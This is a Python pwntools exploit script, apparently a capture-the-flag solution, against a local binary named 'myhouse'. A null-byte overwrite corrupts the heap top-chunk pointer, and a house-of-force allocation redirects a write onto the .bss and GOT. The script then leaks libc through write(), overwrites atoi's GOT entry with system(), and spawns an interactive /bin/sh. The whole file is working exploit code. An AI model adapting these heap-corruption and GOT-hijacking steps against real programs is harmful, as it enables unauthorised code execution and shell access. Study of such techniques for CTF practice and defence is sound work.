#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2018-12-11 21:43:54
# @Author  : giantbranch (giantbranch@gmail.com)
# @Link    : http://www.giantbranch.cn/
# @tags : 

from pwn import *
context.log_level = "debug"
p = process("./myhouse")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


def init(mmap_topchunkpoint_offset):
	p.recvuntil("What's your name?\n")
	p.send("1" * 0x20)
	p.recvuntil("What is the name of your house?\n")
	p.send("\x00" * (0x100 - 8) + "\xff" * 8)
	p.recvuntil("What is the size of your house?\n")
	p.sendline(str(mmap_topchunkpoint_offset))
	p.recvuntil("Too large!\n")
	# use mmap and use null byte write bug to write top chunk point
	p.sendline(str(0x200000))
	p.recvuntil("Give me its description:\n")
	p.send("not use")
	

def build_room(size):
	p.recvuntil("Your choice:\n")
	p.sendline("1")
	p.recvuntil("What is the size of your room?\n")
	p.sendline(str(size))

def decorate_room(content):
	p.recvuntil("Your choice:\n")
	p.sendline("2")
	p.recvuntil("Make your room more shining!\n")
	p.sendline(content)

def show_house():
	p.recvuntil("Your choice:\n")
	p.sendline("3")



def getpid():
	print proc.pidof(p)[0]
	pause()

mmap_topchunkpoint_offset = 6052713
atoi_got = 0x602058
write_got = 0x602018
set_buf_plt = 0x400710
# .bss:00000000006020C0 housed
house_description_addr = 0x00000000006020C0
housen_addr = 0x602100
mmap_system_distance = 2384768

# use null byte overwrite top chunk point to house of force
init(mmap_topchunkpoint_offset)

# leak heap addr
show_house()
p.recvuntil("1" * 0x20)
heap_addr = u64(p.recvuntil("\n")[:-1].ljust(8, "\x00"))
print "heap_addr = " + hex(heap_addr)
fake_topchunk_addr = heap_addr + 240
print "fake_topchunk_addr = " + hex(fake_topchunk_addr)

# fake_topchunk_addr + malloc_size = house_description_addr - 0x10
malloc_size = house_description_addr - 0x20 - fake_topchunk_addr 

# 劫持到house_description, 写got表，泄露libc
build_room(malloc_size)
build_room(0x100)
decorate_room(p64(write_got) + p64(atoi_got))
show_house()
p.recvuntil("And description:\n")
write_addr = u64(p.recvuntil("\n")[:-1].ljust(8, "\x00"))
print "write_addr = " + hex(write_addr)
# 计算system和/bin/sh的地址
print "\ncalculating system() addr ... ###"
system_addr = write_addr + (libc.symbols['system'] - libc.symbols['write'])
print "system_addr = " + hex(system_addr)
# system_addr = mmap_addr + mmap_system_distance
# print "system_addr = " + hex(system_addr)

# 覆盖room，写got表
decorate_room(p64(system_addr))
p.recvuntil("Your choice:\n")
p.sendline("/bin/sh\x00")

p.interactive()
